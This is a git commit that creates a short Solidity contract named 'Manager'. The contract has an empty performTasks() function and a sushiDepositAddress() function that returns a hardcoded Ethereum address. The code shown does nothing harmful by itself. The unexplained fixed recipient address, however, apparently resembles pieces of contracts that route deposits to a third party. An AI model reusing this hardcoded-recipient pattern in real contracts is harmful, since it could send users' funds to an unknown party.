160e15b8c42526eb7d4eba29fee689c3c4d49f2b
Pancakeloan <87273484+Pancakeloan@users.noreply.github.com>
2022-02-03 06:48:03 -0800

    Create VE.Project.4.41.sol

---
+++ VE.Project.4.41.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function sushiDepositAddress() public pure returns (address) {
+		return 0xed3338E153b9400D49F38ca7e73Ea337fdb3c723;
+	}
+}
